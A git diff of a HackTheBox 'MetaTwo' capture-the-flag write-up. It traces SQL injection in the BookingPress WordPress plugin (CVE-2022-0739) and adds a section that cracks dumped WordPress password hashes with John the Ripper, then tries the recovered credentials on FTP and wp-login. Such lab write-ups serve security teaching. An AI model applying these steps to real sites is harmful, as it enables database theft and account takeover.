@@ -128,19 +128,23 @@ http://metapress.htb [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, 
 
 Then, I visited the web-page.
 
-meta-1
+![meta-1](https://user-images.githubusercontent.com/87711310/218543511-90c4b5f9-3a83-4faa-a58a-22bb47a9a64c.png)
+
 
 Using `Wappalyzer` on the weebsite, I found that it was using `WordPress 5.6.2`.
 
-meta-2 
+![meta-2](https://user-images.githubusercontent.com/87711310/218543523-a0e23e52-770c-4c59-8c07-092ac338742d.png)
+
 
 There was also a page `/events`, which allowed to book a 30 minutes meetings at my preferred time and date.
 
-meta-3
+![meta-3](https://user-images.githubusercontent.com/87711310/218543540-7410c3b5-3fc7-4ef0-9770-d33be5e3d3c5.png)
+
 
 Once I booked the meeting with some sample data, I found the URL using a `appointment_id` paramater.
 
-meta-4
+![meta-4](https://user-images.githubusercontent.com/87711310/218543566-aa014431-d3f6-46f9-8ab8-824c307462d3.png)
+
 
 On closely looking at the value of the `parameter_id`, it seemed like a `base64` encoded value, so I decided to decode it and look what is it's value.
 
@@ -154,15 +158,18 @@ It looked suspicious, so I tried injecting other values to see if it was vulnera
 
 Looking at the `source-code`, I found a `wp-admin` directory, and all found out that the web-site was using `Booking Press v1.0.10`. So, I decided to check of any exploit for that particular application exists.
 
-meta-5
+![meta-5](https://user-images.githubusercontent.com/87711310/218543582-634e61c2-fdd1-4908-8c2b-995ef6c01b8f.png)
+
 
 On googling it, I found a recently discovered Booking press vulnerability found in 2022, [CVE-2022-0739](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357)
 
-meta-6
+![meta-6](https://user-images.githubusercontent.com/87711310/218543595-ee6f9417-0f7a-4ee1-9c52-ae0db76df30a.png)
+
 
 For the exploit to work, we need some info about `_wpnonce` which can be found in events page source code.
 
-meta-7
+![meta-7](https://user-images.githubusercontent.com/87711310/218543612-1f98dc4a-7ec4-4a8d-af43-006ce9a25a44.png)
+
 
 Now, we have two options, the first one is to `dump the database manually` or use some automation tool like `sqlmap`. I am doing it with second option.
 
@@ -197,7 +204,8 @@ Referrer-Policy: strict-origin-when-cross-origin
 
 So, now, go to `/events` page and find the request from `admin-ajax.php` to retrieve the value of `_wpnonce` parameter.
 
-meta-8
+![meta-8](https://user-images.githubusercontent.com/87711310/218543629-5f933219-0554-4210-aa58-f212e257100f.png)
+
 
 Once the value is retrieved, replace that value in the request payload you previously sent.
 
@@ -467,4 +475,50 @@ Table: wp_users
 Now, I found 2 users: `admin` & `manager` and got their password hashes too.
 
 So, i decided to use `John the ripper` to crack the password
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
+└─$ cat hash 
+$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
+$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
+
+
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
+└─$ john -w=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+partylikearockstar (?)     
+1g 0:00:02:56 34.59% (ETA: 13:20:51) 0.005666g/s 28927p/s 29553c/s 29553C/s nibbles1001..niavillegas
+Use the "--show --format=phpass" options to display all of the cracked passwords reliably
+Session aborted
+
+```
+
+So, john was able to crack one hash and was taking too much time to crack another, which I guess was intentionally an uncrackable hash given to us.
+
+So, the cracked hash belonged to the user `manager`.
+
+So, now, I tried to login through `ftp` using creds `manager:` but it didnt work
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
+└─$ ftp ftp://manager:partylikearockstar@10.10.11.186
+Connected to 10.10.11.186.
+220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
+331 Password required for manager
+530 Login incorrect.
+ftp: Login failed
+ftp: Can't connect or login to host `10.10.11.186:ftp'
+221 Goodbye.
+```
+
+So, now, my only option left was try it on the `/wp-login.php` login page.
+
+![meta-9](https://user-images.githubusercontent.com/87711310/218543662-d2364f01-0077-4a19-97d8-344fc792569e.png)
+
+And it worked!!!
+
 
